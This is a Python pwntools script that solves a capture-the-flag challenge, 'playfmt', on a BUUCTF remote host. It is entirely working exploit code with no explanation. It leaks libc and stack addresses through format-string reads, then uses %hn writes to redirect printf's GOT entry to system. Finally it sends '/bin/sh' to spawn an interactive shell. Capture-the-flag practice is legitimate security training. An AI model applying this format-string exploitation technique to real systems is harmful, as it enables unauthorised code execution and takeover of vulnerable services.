from pwn import *

#context.log_level = 'debug'

#p = process('./playfmt')
p = remote('node4.buuoj.cn', 25475)
elf = ELF('playfmt')
libc = ELF('libc-2.23.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/32/libc-2.23.debug.so
    ''' + s)

ru(b'\n=====================\n')
sn(b'%15$p,,,%6$p')
libc_base = int(rv(10), 16) - libc.sym['__libc_start_main'] - 247
success('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

ru(b',,,')
rbp = int(rv(10), 16) - 0x10
success('rbp -> {}'.format(hex(rbp)))

printf_got = elf.got['printf']

payload = ('%' + str((rbp - 0x4) & 0xffff) + 'c%6$hnqwq').encode()
sn(payload)
ru(b'qwq')
payload = ('%' + str(printf_got & 0xffff) + 'c%10$hnqwq').encode()
sn(payload)
ru(b'qwq')

payload = ('%' + str((rbp + 0x4) & 0xffff) + 'c%6$hnqwq').encode()
sn(payload)
ru(b'qwq')
payload = ('%' + str((printf_got + 2) & 0xffff) + 'c%10$hnqwq').encode()
sn(payload)
ru(b'qwq')

ary = [system & 0xffff, (system >> 16)]
oary = ary.copy()
oary = [oary[0], 0, oary[1]]
ary.sort()

payload = '%' + str(ary[0]) + 'c%' + str(oary.index(ary[0]) + 5) + '$hn%' 
payload += str(ary[1] - ary[0]) + 'c%' + str(oary.index(ary[1]) + 5) + '$hnqwq'
sn(payload.encode())
ru(b'qwq')

sn(b'/bin/sh\x00')

p.interactive()